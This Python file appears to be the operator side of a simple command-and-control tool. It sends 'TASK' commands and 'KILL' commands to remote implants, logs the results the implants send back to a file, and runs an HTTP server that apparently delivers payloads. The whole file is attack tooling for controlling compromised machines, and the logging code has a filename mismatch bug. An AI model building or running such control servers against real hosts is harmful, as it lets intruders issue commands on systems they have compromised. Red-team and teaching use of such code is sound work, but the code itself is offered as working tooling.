import socket
from threading import Thread
from http.server import HTTPServer, SimpleHTTPRequestHandler
from server_func import *
import os

def web_task(HOST,PORT):
    http_socket = HTTPServer((HOST,PORT),SimpleHTTPRequestHandler)
    http_socket.serve_forever()

def implant_task_socket(HOST, PORT, OPTION="TASK"):
    CLIENT = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    CLIENT.connect((HOST,PORT))
    if OPTION == "TASK":
        CLIENT.send(b"TASK")
        print(CLIENT.recv(1024).decode())
        cmd = input("")
        CLIENT.send(cmd.encode())
        print(CLIENT.recv(1024).decode())
        CLIENT.close()
    elif OPTION == "KILL":
        CLIENT.send(b"KILL")
        print(CLIENT.recv(1024).decode())


def server_listen(HOST,PORT):
    SERVER = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    SERVER.bind((HOST,PORT))
    SERVER.listen()
    while True:
        client,client_addr = SERVER.accept()
        if os.path.exists("task-completed.txt"):
            FH_RESULTS = open("task-completed.txt",'a')
        else:
            FH_RESULTS = open("task-completed",'w')
        msg = client.recv(1024)
        FH_RESULTS.write(msg.decode())
        FH_RESULTS.close()

def menu ():
    while True:
        print("This is a menu test. Check out some options: \n1. send a task\n2. kill the implant\n")
        opt = input("Choose your option: ")
        print("Enter the target address: ")
        addr = input("")
        print("Enter the target port: ")
        port = input("")
        print(f"Connecting to {addr}:{int(port)}")
        if opt == '1':
            implant_task_socket(addr,int(port),"TASK")
        elif opt == '2':
            implant_task_socket(addr,int(port),"KILL")